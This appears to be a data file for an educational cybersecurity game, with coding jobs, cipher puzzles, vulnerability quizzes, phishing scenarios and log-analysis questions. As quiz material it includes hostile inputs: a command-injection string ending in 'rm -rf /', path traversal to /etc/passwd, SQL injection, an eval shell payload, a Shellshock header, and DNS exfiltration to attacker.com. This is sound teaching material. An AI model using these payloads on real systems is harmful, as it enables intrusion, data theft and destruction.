
import { Job, ShopItem, ReverseChallenge, CryptoChallenge, VulnChallenge, SocialChallenge, SignalChallenge } from "../types";

export const FREELANCE_JOBS: Job[] = [
  {
    id: "job-1",
    client: "Local Bakery",
    title: "Fix Cash Register",
    description: "Our register is adding tax incorrectly. It should add 15% VAT. Write a function `calculate_total(price)` that returns price + 15%.",
    difficulty: 1,
    reward: 50,
    requiredLevel: 1,
    completed: false,
    userStarterCode: "def calculate_total(price):\n    # Write logic here\n    return 0",
    validationCode: "result = calculate_total(100)\nif result == 115: print('SUCCESS')\nelse: print('FAIL')" 
  },
  {
    id: "job-2",
    client: "Unknown_User",
    title: "Decrypt Login",
    description: "I forgot my password logic. It seems to reverse the string and add '123' at the end. Write `recover(text)`.",
    difficulty: 2,
    reward: 120,
    requiredLevel: 2,
    completed: false,
    userStarterCode: "def recover(text):\n    # Reverse + '123'\n    return ''",
    validationCode: "if recover('abc') == 'cba123': print('SUCCESS')\nelse: print('FAIL')"
  },
  {
    id: "job-3",
    client: "Bank of Abyssinia (Fake)",
    title: "Validate CC Number",
    description: "We need a script to check if a credit card number starts with '4' (Visa) and is 16 digits long.",
    difficulty: 3,
    reward: 300,
    requiredLevel: 5,
    completed: false,
    userStarterCode: "def is_valid_visa(cc_string):\n    return False",
    validationCode: "if is_valid_visa('4000000000000000') and not is_valid_visa('500'): print('SUCCESS')\nelse: print('FAIL')"
  }
];

export const SHOP_ITEMS: ShopItem[] = [
  { id: "item-vpn", name: "Premium VPN", price: 100, icon: "Globe", description: "Masks your IP. Cosmetic upgrade.", owned: false },
  { id: "item-gpu", name: "RTX 4090 Cloud", price: 500, icon: "Cpu", description: "Faster cracking simulations.", owned: false },
  { id: "item-kali", name: "Kali Linux Theme", price: 1000, icon: "Terminal", description: "Unlocks special dark mode.", owned: false }
];

export const REVERSE_CHALLENGES: ReverseChallenge[] = [
  {
    id: "rev-1",
    title: "Lvl 1: The Offset",
    description: "ይህ ማሽን ቁጥሩን ይቀበላል፣ የሆነ ቁጥር ደምሮ ይመልሳል። ስንት እንደተደመረ እወቅ። (Hint: Linear Addition)",
    difficulty: "Easy",
    inputs: [0, 10, 50],
    hiddenLogic: (x) => x + 7,
    targetAnswer: "x + 7",
    hint: "Try inputting 0. The output will reveal the added number.",
    rewardXP: 50,
    solved: false
  },
  {
    id: "rev-2",
    title: "Lvl 2: The Multiplier",
    description: "ቁጥሩ በስንት እየተባዛ ነው? (Hint: Multiplication)",
    difficulty: "Easy",
    inputs: [1, 5, 10],
    hiddenLogic: (x) => x * 4,
    targetAnswer: "x * 4",
    hint: "If input is 1 and output is 4, what is the factor?",
    rewardXP: 75,
    solved: false
  },
  {
    id: "rev-3",
    title: "Lvl 3: The Combo",
    description: "ሁለት ነገሮች ይፈጠራሉ፡ ማባዛት እና መደመር። በቅደም ተከተል አስብ። (y = mx + b)",
    difficulty: "Easy",
    inputs: [2, 3, 5],
    hiddenLogic: (x) => (x * 2) - 1,
    targetAnswer: "x * 2 - 1",
    hint: "Look at the slope. How much does the output increase when input increases by 1?",
    rewardXP: 100,
    solved: false
  },
  {
    id: "rev-4",
    title: "Lvl 4: The Parabola",
    description: "ቁጥሩ በፍጥነት ነው የሚያድገው። Exponential growth።",
    difficulty: "Easy",
    inputs: [2, 5, 10],
    hiddenLogic: (x) => x * x,
    targetAnswer: "x ** 2",
    hint: "Think about squaring the number.",
    rewardXP: 125,
    solved: false
  },
  {
    id: "rev-5",
    title: "Lvl 5: The Remainder",
    description: "ቁጥሩ ወደ ውስጥ ሲገባ ውጤቱ ሁልጊዜ ከ 10 በታች ነው። የመጨረሻውን ዲጂት ነው የሚፈልገው። (Modulo Operator)",
    difficulty: "Hard",
    inputs: [12, 25, 108],
    hiddenLogic: (x) => x % 10,
    targetAnswer: "x % 10",
    hint: "The '%' operator gives the remainder.",
    rewardXP: 200,
    solved: false
  },
  {
    id: "rev-6",
    title: "Lvl 6: The Chopper",
    description: "ቁጥሩን በግማሽ ይቀንሰዋል፣ ግን ነጥብ (decimal) አይወድም። (Integer Division)",
    difficulty: "Hard",
    inputs: [9, 10, 21],
    hiddenLogic: (x) => Math.floor(x / 2),
    targetAnswer: "x // 2", 
    hint: "Use floor division operator '//'.",
    rewardXP: 250,
    solved: false
  },
  {
    id: "rev-7",
    title: "Lvl 7: Quadratic Curve",
    description: "ቁጥሩን ካሬ (Square) አድርጎ... የሆነ ነገር ይቀንሳል? (x^2 - x)",
    difficulty: "Hard",
    inputs: [2, 3, 10],
    hiddenLogic: (x) => (x * x) - x,
    targetAnswer: "x ** 2 - x",
    hint: "Try factoring: x * (x - 1).",
    rewardXP: 300,
    solved: false
  },
  {
    id: "rev-8",
    title: "Lvl 8: Absolute Zero",
    description: "ከ 50 ያለውን ርቀት ይለካል። Negative ቁጥር አይመልስም። (Absolute Difference)",
    difficulty: "Hard",
    inputs: [40, 60, 50],
    hiddenLogic: (x) => Math.abs(x - 50),
    targetAnswer: "abs(x - 50)",
    hint: "The absolute value function removes the negative sign.",
    rewardXP: 350,
    solved: false
  },
  {
    id: "rev-9",
    title: "Lvl 9: The Hacker's XOR",
    description: "Classic Encryption! አንድ አይነት ቁጥር ስታስገባ ይመለሳል፣ ሌላ ስታስገባ ይቀየራል። (Bitwise XOR with 123)",
    difficulty: "Insane",
    inputs: [0, 123, 1],
    hiddenLogic: (x) => x ^ 123,
    targetAnswer: "x ^ 123",
    hint: "The operator is '^'. Try inputting 0.",
    rewardXP: 500,
    solved: false
  },
  {
    id: "rev-10",
    title: "Lvl 10: The Mirror",
    description: "የቁጥሩን አቅጣጫ ይቀይራል (Reverse digits). Python slicing magic!",
    difficulty: "Insane",
    inputs: [12, 123, 509],
    hiddenLogic: (x) => parseInt(x.toString().split('').reverse().join('')),
    targetAnswer: "int(str(x)[::-1])",
    hint: "Convert to string, use slice [::-1], then convert back to int.",
    rewardXP: 1000,
    solved: false
  }
];

export const CRYPTO_CHALLENGES: CryptoChallenge[] = [
  {
    id: "cry-1",
    title: "Level 1: Caesar's Secret",
    description: "The classic Caesar Cipher. Every letter is shifted by 1. 'a' becomes 'b'.",
    ciphertext: "ibdl",
    solution: "hack",
    hint: "Shift each letter back by 1 (b -> a).",
    difficulty: "Easy",
    rewardXP: 50,
    solved: false
  },
  {
    id: "cry-2",
    title: "Level 2: The Reversal",
    description: "Sometimes hackers just read backwards. Decode this.",
    ciphertext: "dlrow olleh",
    solution: "hello world",
    hint: "Python: text[::-1]",
    difficulty: "Easy",
    rewardXP: 75,
    solved: false
  },
  {
    id: "cry-3",
    title: "Level 3: Hex Speak",
    description: "Computers speak in Hexadecimal. Convert these bytes to ASCII text.",
    ciphertext: "50 79 74 68 6f 6e",
    solution: "Python",
    hint: "Use an online hex converter or Python's bytes.fromhex()",
    difficulty: "Easy",
    rewardXP: 100,
    solved: false
  },
  {
    id: "cry-4",
    title: "Level 4: Base64 Encoding",
    description: "The most common encoding on the web. It ends with '=' usually.",
    ciphertext: "QWRtaW4=",
    solution: "Admin",
    hint: "import base64; base64.b64decode(...)",
    difficulty: "Medium",
    rewardXP: 150,
    solved: false
  },
  {
    id: "cry-5",
    title: "Level 5: ASCII Shift",
    description: "Decimal ASCII values. Convert numbers to text.",
    ciphertext: "65 66 67",
    solution: "ABC",
    hint: "chr(65) is 'A'",
    difficulty: "Medium",
    rewardXP: 200,
    solved: false
  },
  {
    id: "cry-6",
    title: "Level 6: Binary Talk",
    description: "The language of the machine. 0s and 1s.",
    ciphertext: "01000111 01001111",
    solution: "GO",
    hint: "8 bits make 1 byte/letter.",
    difficulty: "Medium",
    rewardXP: 250,
    solved: false
  },
  {
    id: "cry-7",
    title: "Level 7: URL Encoding",
    description: "Web browsers use this to encode special characters.",
    ciphertext: "%3Cscript%3E",
    solution: "<script>",
    hint: "%3C is '<' and %3E is '>'",
    difficulty: "Hard",
    rewardXP: 300,
    solved: false
  },
  {
    id: "cry-8",
    title: "Level 8: ROT13",
    description: "Rotate by 13 places. It's its own inverse (apply twice to decode).",
    ciphertext: "Synt",
    solution: "Flag",
    hint: "A becomes N, B becomes O...",
    difficulty: "Hard",
    rewardXP: 350,
    solved: false
  },
  {
    id: "cry-9",
    title: "Level 9: Atbash Cipher",
    description: "Mirror the alphabet. A becomes Z, B becomes Y.",
    ciphertext: "Svool",
    solution: "Hello",
    hint: "Reverse the alphabet mapping.",
    difficulty: "Insane",
    rewardXP: 500,
    solved: false
  },
  {
    id: "cry-10",
    title: "Level 10: The Onion Layer",
    description: "Mixed Methods: It's Base64 of a Reversed String.",
    ciphertext: "Z25pa2NhSA==",
    solution: "Hacking",
    hint: "First Decode Base64, Then Reverse the result.",
    difficulty: "Insane",
    rewardXP: 1000,
    solved: false
  }
];

export const VULN_CHALLENGES: VulnChallenge[] = [
  {
    id: "vuln-1",
    title: "Level 1: The Open Door",
    description: "ይህ ኮድ ወደ Login System የሚገባበት ነው፣ ግን ትልቅ ስህተት አለው። አጥቂው ኮዱን ቢያገኘው ፓስዎርዱን በቀላሉ ያውቃል።",
    codeSnippet: "def login():\n    username = input('User: ')\n    password = input('Pass: ')\n    # Developer Note: Remove this before production!\n    if username == 'admin' and password == 'SuperSecret123':\n        print('Access Granted')",
    vulnerability: "Hardcoded Credentials",
    options: ["SQL Injection", "Hardcoded Credentials", "Buffer Overflow", "Cross-Site Scripting"],
    explanation: "Passwords should NEVER be written directly in the code (Hardcoded). If hackers see the source code, they instantly have access. Use Environment Variables or Hash Vaults.",
    hint: "Look closely at the 'if' statement. Are the secrets visible?",
    difficulty: "Easy",
    rewardXP: 50,
    solved: false
  },
  {
    id: "vuln-2",
    title: "Level 2: The Concatenation",
    description: "ተጠቃሚው የሚያስገባው መረጃ በቀጥታ ከ Database Query ጋር ይጋጠማል። ይህ ለምን አደገኛ ነው?",
    codeSnippet: "user_input = request.form['user']\n# Direct string concatenation\nquery = \"SELECT * FROM users WHERE name = '\" + user_input + \"';\"\ndb.execute(query)",
    vulnerability: "SQL Injection",
    options: ["Command Injection", "SQL Injection", "Weak Encryption", "Path Traversal"],
    explanation: "Constructing SQL queries by joining strings allows attackers to input \"' OR 1=1 --\" and bypass authentication. Always use Parameterized Queries.",
    hint: "The database query is being built using '+'. This is the #1 database risk.",
    difficulty: "Easy",
    rewardXP: 75,
    solved: false
  },
  {
    id: "vuln-3",
    title: "Level 3: System Access",
    description: "ይህ ስክሪፕት IP Address ተቀብሎ Ping ያደርጋል። አጥቂው `127.0.0.1; rm -rf /` ብሎ ቢያስገባ ምን ይፈጠራል?",
    codeSnippet: "import os\nip = input('Enter IP to ping: ')\n# Executing shell command directly\nos.system('ping ' + ip)",
    vulnerability: "Command Injection",
    options: ["Command Injection", "Memory Leak", "Race Condition", "Denial of Service"],
    explanation: "Passing unsanitized user input to `os.system` allows execution of arbitrary system commands. Use `subprocess.run` with list arguments instead.",
    hint: "The code runs a shell command using 'os.system'.",
    difficulty: "Medium",
    rewardXP: 100,
    solved: false
  },
  {
    id: "vuln-4",
    title: "Level 4: Fake Security",
    description: "Developer-u ዳታውን 'Encrypt' አደረግኩ ብሎ ያስባል። ግን የተጠቀመው `base64` ነው።",
    codeSnippet: "import base64\npassword = 'mypassword'\n# 'Encrypting' for safety\nsecure_pass = base64.b64encode(password.encode())\nprint(secure_pass)",
    vulnerability: "Weak/No Encryption",
    options: ["Weak/No Encryption", "Hashing", "Salted Hash", "AES-256"],
    explanation: "Base64 is NOT encryption; it is Encoding. Anyone can decode it. Use strong algorithms like AES or hashing algorithms like SHA-256/Bcrypt.",
    hint: "Encoding (like Base64) is reversible without a key. Encryption requires a key.",
    difficulty: "Medium",
    rewardXP: 125,
    solved: false
  },
  {
    id: "vuln-5",
    title: "Level 5: Walking the Path",
    description: "ተጠቃሚው ፋይል ስም እንዲያስገባ ይጠየቃል። `../../etc/passwd` ብሎ ቢያስገባስ?",
    codeSnippet: "filename = request.args.get('file')\n# Opens file directly from input\nwith open('/var/www/html/' + filename, 'r') as f:\n    print(f.read())",
    vulnerability: "Path Traversal",
    options: ["File Inclusion", "Path Traversal", "XSS", "Broken Access Control"],
    explanation: "Path Traversal (Directory Traversal) allows attackers to access files outside the intended directory by using `../` patterns.",
    hint: "The attacker is trying to traverse 'up' the directory tree.",
    difficulty: "Medium",
    rewardXP: 150,
    solved: false
  },
  {
    id: "vuln-6",
    title: "Level 6: The Pickle",
    description: "Python `pickle` ሞጁል አደገኛ ነው። እዚህ ጋር ከ Network የመጣን ዳታ በቀጥታ ይከፍታል።",
    codeSnippet: "import pickle\n# Receiving data from untrusted source\ndata = network.recv(1024)\nobj = pickle.loads(data)",
    vulnerability: "Insecure Deserialization",
    options: ["Buffer Overflow", "Insecure Deserialization", "XML Injection", "Race Condition"],
    explanation: "Pickle allows execution of arbitrary code during deserialization. Never unpickle data from untrusted sources. Use JSON instead.",
    hint: "Turning data back into an object (serialization) without checking its source is dangerous.",
    difficulty: "Hard",
    rewardXP: 200,
    solved: false
  },
  {
    id: "vuln-7",
    title: "Level 7: Evil Evaluation",
    description: "`eval()` ወይም `exec()` ማንኛውንም Python code ያስኬዳሉ።",
    codeSnippet: "user_math = input('Enter math problem: ')\n# Calculates result\nresult = eval(user_math)",
    vulnerability: "Code Injection (Eval)",
    options: ["Code Injection (Eval)", "Math Error", "Integer Overflow", "Logic Bomb"],
    explanation: "If a user inputs `__import__('os').system('sh')`, they get a shell. `eval()` is extremely dangerous on user input.",
    hint: "The function evaluates a string as code.",
    difficulty: "Hard",
    rewardXP: 250,
    solved: false
  },
  {
    id: "vuln-8",
    title: "Level 8: Predictable Tokens",
    description: "ለ Password Reset Token እየተጠቀምን ነው። `random` ሞጁል ግን ለዚህ አልተሰራም።",
    codeSnippet: "import random\n# Generating session token\ntoken = random.randint(100000, 999999)",
    vulnerability: "Weak Randomness",
    options: ["Weak Randomness", "High Entropy", "Hardcoded Seed", "Bit Flipping"],
    explanation: "Standard `random` is predictable (Pseudo-Random). For security tokens, always use `secrets` module (Cryptographically Secure Pseudo-Random Number Generator).",
    hint: "Is `random` truly random enough for security?",
    difficulty: "Hard",
    rewardXP: 300,
    solved: false
  },
  {
    id: "vuln-9",
    title: "Level 9: Reflected Mirror",
    description: "ይህ የ Web Server ኮድ ተጠቃሚው የጻፈውን መልሶ በ HTML ውስጥ ይለጥፋል። `<script>alert(1)</script>` ቢጻፍስ?",
    codeSnippet: "@app.route('/search')\ndef search():\n    q = request.args.get('q')\n    return f'<h1>You searched for: {q}</h1>'",
    vulnerability: "Cross-Site Scripting (XSS)",
    options: ["CSRF", "XSS", "SQL Injection", "Header Injection"],
    explanation: "Reflecting user input without escaping HTML characters leads to XSS. Attackers can inject JavaScript to steal cookies.",
    hint: "It involves scripts running in the browser (Client-Side).",
    difficulty: "Insane",
    rewardXP: 400,
    solved: false
  },
  {
    id: "vuln-10",
    title: "Level 10: C++ Memory",
    description: "ይህ የ C++ ኮድ ነው። `strcpy` የመጠን ገደብ (Length Check) አያደርግም።",
    codeSnippet: "void func(char* str) {\n    char buffer[10];\n    // Copies input into small buffer\n    strcpy(buffer, str);\n}",
    vulnerability: "Buffer Overflow",
    options: ["Memory Leak", "Buffer Overflow", "Null Pointer Dereference", "Use After Free"],
    explanation: "Writing more data than a buffer can hold overwrites adjacent memory (Stack/Heap), potentially leading to Remote Code Execution (RCE). Use `strncpy`.",
    hint: "What happens if I pour 1 liter of water into a 100ml cup?",
    difficulty: "Insane",
    rewardXP: 500,
    solved: false
  }
];

export const SOCIAL_CHALLENGES: SocialChallenge[] = [
  {
    id: "soc-1",
    title: "Lvl 1: The Nigerian Prince",
    description: "Analyze this email. It promises millions of dollars but has poor grammar.",
    scenario: {
      from: "prince.alabi202@yahoo.com",
      subject: "GOOD NEWS FOR YOU SIR",
      body: "Dearest Beloved, I am Prince Alabi. I have $50 Million USD trapped in my country. I need your bank account to transfer it. I will give you 10%."
    },
    attackType: "419 Scam / Advance Fee Fraud",
    options: ["Spear Phishing", "419 Scam / Advance Fee Fraud", "Ransomware", "Tech Support Scam"],
    explanation: "The 'Nigerian Prince' scam is the most classic 'Advance Fee Fraud'. It promises huge wealth in exchange for a small upfront fee or bank details.",
    hint: "They want a small fee now for a big reward later.",
    difficulty: "Easy",
    rewardXP: 50,
    solved: false
  },
  {
    id: "soc-2",
    title: "Lvl 2: The Urgent Warning",
    description: "Banks never ask for passwords via email. Look at the urgency.",
    scenario: {
      from: "security@cbe-ethiopia-alert.com",
      subject: "URGENT: Your Account will be BLOCKED!",
      body: "Dear Customer, suspicious activity detected. Click this link IMMEDIATELY to verify your identity or your account will be closed in 24 hours."
    },
    attackType: "Urgency / Fear Mongering",
    options: ["Urgency / Fear Mongering", "Quid Pro Quo", "Baiting", "Tailgating"],
    explanation: "Attackers use fear and urgency ('Blocked in 24 hours') to make you act without thinking. Real banks don't threaten via email.",
    hint: "They are trying to scare you into acting fast.",
    difficulty: "Easy",
    rewardXP: 75,
    solved: false
  },
  {
    id: "soc-3",
    title: "Lvl 3: Spot the Typo",
    description: "Look closely at the URL. Is it really Google?",
    scenario: {
      from: "admin@g0ogle.com",
      subject: "Update your password",
      body: "Please update your credentials at: http://www.g0ogle.com/login"
    },
    attackType: "Typosquatting / URL Hijacking",
    options: ["SQL Injection", "Typosquatting / URL Hijacking", "Man in the Middle", "DNS Poisoning"],
    explanation: "Using '0' instead of 'o' (g0ogle.com) is Typosquatting. Users often miss these small visual tricks.",
    hint: "Check the spelling of the domain name carefully.",
    difficulty: "Easy",
    rewardXP: 100,
    solved: false
  },
  {
    id: "soc-4",
    title: "Lvl 4: The Boss is Asking",
    description: "An email from the 'CEO' asking for a favor. Check the request type.",
    scenario: {
      from: "ceo@company-corp.net", 
      subject: "Urgent Task",
      body: "I am in a meeting and can't talk. I need you to buy 5 Apple Gift Cards ($100 each) for a client immediately. Send me the codes. Don't call me."
    },
    attackType: "CEO Fraud / BEC",
    options: ["CEO Fraud / BEC", "Whaling", "Watering Hole", "Dumpster Diving"],
    explanation: "Business Email Compromise (BEC) often involves impersonating executives asking for Gift Cards or Wire Transfers urgently.",
    hint: "Impersonating a high-level executive (Whale).",
    difficulty: "Medium",
    rewardXP: 125,
    solved: false
  },
  {
    id: "soc-5",
    title: "Lvl 5: IT Support Calling",
    description: "Someone calls claiming to be from 'Microsoft'.",
    scenario: {
      from: "Unknown Caller (+1 800 ...)",
      subject: "Phone Call Transcript",
      body: "\"Hello, this is Microsoft Support. We detected a virus on your computer. Please download TeamViewer so I can fix it for you.\""
    },
    attackType: "Tech Support Scam / Vishing",
    options: ["Pretexting", "Tech Support Scam / Vishing", "Shoulder Surfing", "Keylogging"],
    explanation: "Microsoft/Google will NEVER call you to fix a virus. This is Vishing (Voice Phishing) to gain remote access.",
    hint: "Phishing performed over Voice (Phone).",
    difficulty: "Medium",
    rewardXP: 150,
    solved: false
  },
  {
    id: "soc-6",
    title: "Lvl 6: The Friendly HR",
    description: "An attacker creates a fake scenario to steal info.",
    scenario: {
      from: "hr-update@internal-portal.org",
      subject: "Employee Survey",
      body: "Hi! We are updating our records. Please reply with your Date of Birth and Mother's Maiden Name to win a free lunch coupon!"
    },
    attackType: "Pretexting",
    options: ["Pretexting", "Tailgating", "Baiting", "Skimming"],
    explanation: "Pretexting is creating a fabricated scenario (The Survey) to steal personal information used for security questions.",
    hint: "Creating a pretext or fake scenario to get data.",
    difficulty: "Medium",
    rewardXP: 200,
    solved: false
  },
  {
    id: "soc-7",
    title: "Lvl 7: Spear Phishing",
    description: "This email knows too much about you.",
    scenario: {
      from: "john@hobby-club.com",
      subject: "Photos from the hiking trip",
      body: "Hey [Name], it was great seeing you at the Entoto hike last Saturday! I attached the photos we took near the waterfall. Check them out."
    },
    attackType: "Spear Phishing",
    options: ["Phishing", "Spear Phishing", "Spam", "Adware"],
    explanation: "Unlike generic Phishing, Spear Phishing targets a SPECIFIC person using real details (Entoto hike, Saturday) to build trust.",
    hint: "Phishing targeted at a specific individual.",
    difficulty: "Hard",
    rewardXP: 250,
    solved: false
  },
  {
    id: "soc-8",
    title: "Lvl 8: Quid Pro Quo",
    description: "Something for Something.",
    scenario: {
      from: "Physical Interaction",
      subject: "Office Lobby",
      body: "Attacker stands by the secure door holding heavy boxes of coffee. They ask you: 'Can you hold the door for me? My hands are full.'"
    },
    attackType: "Tailgating / Piggybacking",
    options: ["Tailgating / Piggybacking", "Dumpster Diving", "Eavesdropping", "Lockpicking"],
    explanation: "Tailgating relies on human kindness. The attacker uses the 'heavy box' excuse to get you to bypass physical security for them.",
    hint: "Following someone through a secure door.",
    difficulty: "Hard",
    rewardXP: 300,
    solved: false
  },
  {
    id: "soc-9",
    title: "Lvl 9: The Poisoned Well",
    description: "You didn't click a link, you just visited a site you love.",
    scenario: {
      from: "Browser History",
      subject: "www.ethio-developers-forum.com",
      body: "You visit your favorite developer forum. Suddenly, a prompt appears: 'Java Update Required to view code'. It downloads 'update.exe'."
    },
    attackType: "Watering Hole Attack",
    options: ["Watering Hole Attack", "Drive-by Download", "XSS", "CSRF"],
    explanation: "Attackers compromise a specific legitimate website that their target visits frequently (The 'Watering Hole'), infecting anyone who visits.",
    hint: "Infecting a site where the targets gather to drink (visit).",
    difficulty: "Insane",
    rewardXP: 400,
    solved: false
  },
  {
    id: "soc-10",
    title: "Lvl 10: Deepfake Voice",
    description: "The audio sounds exactly like your boss.",
    scenario: {
      from: "WhatsApp Voice Note",
      subject: "Message from CFO",
      body: "*Audio Playback*: 'Hey, it's [Boss Name]. I'm locked out of my main account. Wire $50k to this vendor ASAP. My voice sounds weird because I have a cold.'"
    },
    attackType: "AI Deepfake / Vishing",
    options: ["Replay Attack", "AI Deepfake / Vishing", "Synthesizer", "Man in the Middle"],
    explanation: "AI technology can now clone voices with few seconds of audio. Verification via a second channel (call them back) is the only defense.",
    hint: "Using AI to mimic a voice or video.",
    difficulty: "Insane",
    rewardXP: 1000,
    solved: false
  }
];

export const SIGNAL_CHALLENGES: SignalChallenge[] = [
  {
    id: "sig-1",
    title: "Level 1: Plaintext Credentials",
    description: "We intercepted this HTTP traffic. What is the user's password?",
    logData: "GET /login?user=admin&pass=Qwerty1234 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0",
    question: "Identify the password in the log:",
    options: ["admin", "Qwerty1234", "example.com", "Mozilla/5.0"],
    correctAnswer: "Qwerty1234",
    explanation: "In standard HTTP (not HTTPS), parameters in the URL are visible in plain text. Never send passwords via GET requests.",
    hint: "Look for parameters in the URL line (GET ...)",
    difficulty: "Easy",
    rewardXP: 50,
    solved: false
  },
  {
    id: "sig-2",
    title: "Level 2: The Scanner",
    description: "Check the Access Logs. Someone is scanning us.",
    logData: "192.168.1.10 - GET / 200\n192.168.1.10 - GET /admin 403\n192.168.1.55 - GET / 200\n192.168.1.55 - GET /wp-login.php 404\n192.168.1.55 - GET /backup.zip 404\n192.168.1.55 - GET /shell.php 404",
    question: "Which IP address is performing a scan?",
    options: ["192.168.1.10", "192.168.1.55"],
    correctAnswer: "192.168.1.55",
    explanation: "192.168.1.55 is requesting multiple sensitive files (/wp-login, /backup, /shell) that don't exist (404). This is typical 'Directory Busting' behavior.",
    hint: "Look for the IP that is generating many 404 (Not Found) errors.",
    difficulty: "Easy",
    rewardXP: 75,
    solved: false
  },
  {
    id: "sig-3",
    title: "Level 3: SQL Injection Signature",
    description: "Identify the malicious payload in the query parameters.",
    logData: "id=10\nid=20\nid=30\nid=1' OR '1'='1",
    question: "Which parameter is an SQL Injection attack?",
    options: ["id=10", "id=1' OR '1'='1", "id=20", "id=30"],
    correctAnswer: "id=1' OR '1'='1",
    explanation: "'OR 1=1' is the most common tautology used to bypass authentication in SQL Injection attacks.",
    hint: "Look for special characters like quotes (') and logical operators (OR).",
    difficulty: "Easy",
    rewardXP: 100,
    solved: false
  },
  {
    id: "sig-4",
    title: "Level 4: Suspicious User-Agent",
    description: "Analyze the User-Agent headers. One of them is a hacking tool.",
    logData: "Mozilla/5.0 (Windows NT 10.0)\nsqlmap/1.4.7#stable (http://sqlmap.org)\nMozilla/5.0 (iPhone; CPU iPhone OS 14_0)\nChrome/90.0.4430.212",
    question: "Which User-Agent belongs to a hacking tool?",
    options: ["Mozilla/5.0 (Windows)", "Chrome/90.0", "sqlmap/1.4.7", "Mozilla/5.0 (iPhone)"],
    correctAnswer: "sqlmap/1.4.7",
    explanation: "Sqlmap is an automated SQL injection tool. It identifies itself in the User-Agent header by default.",
    hint: "The tool name is often part of the User-Agent string.",
    difficulty: "Medium",
    rewardXP: 125,
    solved: false
  },
  {
    id: "sig-5",
    title: "Level 5: Status Code Analysis",
    description: "We are looking for a hidden administrative page. Which one actually exists?",
    logData: "GET /admin.php -> 404 Not Found\nGET /administrator -> 404 Not Found\nGET /dashboard -> 302 Found (Redirect)\nGET /secret -> 403 Forbidden",
    question: "Which endpoint returned a 'Found' status?",
    options: ["/admin.php", "/administrator", "/dashboard", "/secret"],
    correctAnswer: "/dashboard",
    explanation: "HTTP 302 means 'Found' (Redirection). 404 means missing, 403 means forbidden. The dashboard exists but redirected us.",
    hint: "302 indicates a redirect, meaning the page likely exists.",
    difficulty: "Medium",
    rewardXP: 150,
    solved: false
  },
  {
    id: "sig-6",
    title: "Level 6: Hidden in Base64",
    description: "The Authorization header usually contains credentials.",
    logData: "Authorization: Basic YWRtaW46cGFzc3dvcmQ=",
    question: "Decode the Base64 string 'YWRtaW46cGFzc3dvcmQ='",
    options: ["user:1234", "admin:password", "root:toor", "guest:guest"],
    correctAnswer: "admin:password",
    explanation: "Basic Auth uses Base64. Decoding the string reveals 'admin:password'.",
    hint: "Use a Base64 decoder or Python to reveal the text.",
    difficulty: "Medium",
    rewardXP: 200,
    solved: false
  },
  {
    id: "sig-7",
    title: "Level 7: Web Shell Upload",
    description: "Review the file upload logs. Which file is dangerous?",
    logData: "POST /upload.php\nFile: profile_pic.jpg (image/jpeg)\nFile: resume.pdf (application/pdf)\nFile: shell.php (application/x-php)\nFile: data.csv (text/csv)",
    question: "Which file indicates a potential RCE attack?",
    options: ["profile_pic.jpg", "resume.pdf", "shell.php", "data.csv"],
    correctAnswer: "shell.php",
    explanation: "Uploading a PHP file ('shell.php') usually indicates an attempt to install a Web Shell for Remote Code Execution (RCE).",
    hint: "Look for executable file extensions that shouldn't be uploaded (like .php).",
    difficulty: "Hard",
    rewardXP: 250,
    solved: false
  },
  {
    id: "sig-8",
    title: "Level 8: DNS Exfiltration",
    description: "Look at the DNS queries. Someone is stealing data.",
    logData: "Query: google.com\nQuery: facebook.com\nQuery: cGFzc3dvcmQ=.attacker.com\nQuery: yahoo.com",
    question: "Which domain is used for data exfiltration?",
    options: ["google.com", "cGFzc3dvcmQ=.attacker.com", "facebook.com", "yahoo.com"],
    correctAnswer: "cGFzc3dvcmQ=.attacker.com",
    explanation: "Attackers encode stolen data (like passwords) into the subdomain (cGFzc3dvcmQ=) and query their own DNS server to retrieve it.",
    hint: "Look for long, encoded strings in the subdomain part.",
    difficulty: "Hard",
    rewardXP: 300,
    solved: false
  },
  {
    id: "sig-9",
    title: "Level 9: Hex Dump Analysis",
    description: "We found a suspicious file header in the network stream.",
    logData: "00000000  4D 5A 90 00 03 00 00 00  04 00 00 00 FF FF 00 00  |MZ..............|",
    question: "What type of file is this based on the 'MZ' magic bytes?",
    options: ["JPEG Image", "PDF Document", "Windows Executable (EXE)", "Zip Archive"],
    correctAnswer: "Windows Executable (EXE)",
    explanation: "'MZ' (4D 5A) is the magic byte signature for DOS/Windows Executable files. Seeing this in unexpected traffic usually means malware download.",
    hint: "MZ stands for Mark Zbikowski, the designer of the DOS executable format.",
    difficulty: "Insane",
    rewardXP: 400,
    solved: false
  },
  {
    id: "sig-10",
    title: "Level 10: Shellshock",
    description: "An old but deadly vulnerability in the User-Agent.",
    logData: "User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'",
    question: "What is the specific name of this attack?",
    options: ["Heartbleed", "Shellshock", "EternalBlue", "Log4Shell"],
    correctAnswer: "Shellshock",
    explanation: "The pattern '() { :;};' is the signature for the Shellshock vulnerability (CVE-2014-6271), allowing RCE via Bash.",
    hint: "The pattern `() { :;};` is the dead giveaway.",
    difficulty: "Insane",
    rewardXP: 500,
    solved: false
  }
];
